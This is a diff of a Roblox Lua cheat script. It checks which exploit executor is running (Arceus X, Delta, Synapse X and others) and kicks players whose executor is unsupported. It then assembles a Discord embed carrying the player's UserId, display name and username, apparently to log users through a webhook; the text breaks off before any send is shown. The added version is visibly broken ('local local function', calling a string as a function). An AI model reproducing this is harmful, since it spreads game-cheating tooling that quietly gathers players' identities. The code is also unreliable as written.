@@ -1,60 +1,44 @@
-local function getExecutor()
-    if is_arceus_x then
-        return "Arceus X"
-    elseif is_delta then
-        return "Delta"
-    else
-        return "Desconhecido"
-    end
-end
-
-local executor = getExecutor()
-
-if executor == "Desconhecido" then
-    game.Players.LocalPlayer:Kick("Executor não suportado!")
+local local function getExecutor()
+if is_arceus_x then
+return "Arceus X"
+elseif is_delta == true then
+return "Delta"
 else
-    print("Executor correto: " .. executor)
-    
-    local support = {
-        ["Fluxus"] = true,
-        ["Trigon"] = false,
-        ["Codex"] = true,
-        ["Delta"] = true,
-        ["Vega X"] = true,
-        ["Hydrogen"] = true,
-        ["alysse"] = false,
-        ["Arceus X"] = true,  -- Correto
-        ["Electron"] = false,
-    }
-
-    if support[executor] then
-        print("Correct Executor Let's Run uwu")
-    else
-        game.Players.LocalPlayer:Kick("Ko Hỗ Trợ Executor | Not Support Executor | Tidak Mendukung Pelak")
-    end
+return "Desconhecido"
+end
 end
 
-local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or
-    pebc_execute and "ProtoSmasher" or
-    syn and "Synapse X" or
-    secure_load and "Sentinel" or
-    KRNL_LOADED and "Krnl" or
-    SONA_LOADED and "Sona" or
-    "Fluxus"
+local exploit = getExecutor()
+local support = {
+    ["Fluxus"] = true,
+    ["Trigon"] = false,
+    ["Codex"] = true,
+    ["Delta"] = true,
+    ["Vega X"] = true,
+    ["Hydrogen"] = true,
+    ["alysse"] = false,
+    ["ArceusX"] = true,
+    ["Electron"] = false,
+}
 
-local HttpService = game:GetService("HttpService")
-local Data = {
-    ["embeds"] = {
-        {
-            ["title"] = "𝙥𝙡𝙖𝙮𝙚𝙧𝙨 𝙥𝙧𝙤𝙛𝙞𝙡𝙚💻",
-            ["url"] = "https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId,
-            ["description"] = string.format("||
-%s (%s)||", 
-                game.Players.LocalPlayer.DisplayName, 
-                game.Players.LocalPlayer.Name),
-            ["color"] = tonumber(0x7269da),
-            ["thumbnail"] = {
-                ["url"] = "https://cdn.discordapp.com/attachments/1171840145335537824/1201725336598106183/Screenshot_2024-01-28-16-39-42-226_com.facebook.katana-edit.jpg?ex=65cadcef&is=65b867ef&hm=850789c6f502230b1eaa6ffed401f83a8c7d3a5ffea10e13ef382b3806a80615&"
+if support[exploit()]  then
+    print("Correct Executor Let's Run uwu")
+else
+ game.Players.LocalPlayer:Kick("Ko Hỗ Trợ Executor | Not Support Executor | Tidak Mendukung Pelaksana | support fluxus,hydrogen,alysse,trigon,vegaX")
+ end
+    
+local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Fluxus" or
+"Fluxus"
+                    local HttpService = game:GetService("HttpService")
+                     local Data =
+                        {
+                            ["embeds"]= {
+                                {            
+                                    ["title"]= "𝙥𝙡𝙖𝙮𝙚𝙧𝙨 𝙥𝙧𝙤𝙛𝙞𝙡𝙚💻";
+                                    ["url"]= "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId;
+                                    ["description"]= "||```"..game.Players.LocalPlayer.DisplayName.." ("..game.Players.LocalPlayer.Name..")```||";
+                                    ["color"]= tonumber(0x7269da);
+                                     ["thumbnail"] = {["url"] = "https://cdn.discordapp.com/attachments/1171840145335537824/1201725336598106183/Screenshot_2024-01-28-16-39-42-226_com.facebook.katana-edit.jpg?ex=65cadcef&is=65b867ef&hm=850789c6f502230b1eaa6ffed401f83a8c7d3a5ffea10e13ef382b3806a80615&"};
                                     
                                     ["fields"]= {
                                         {
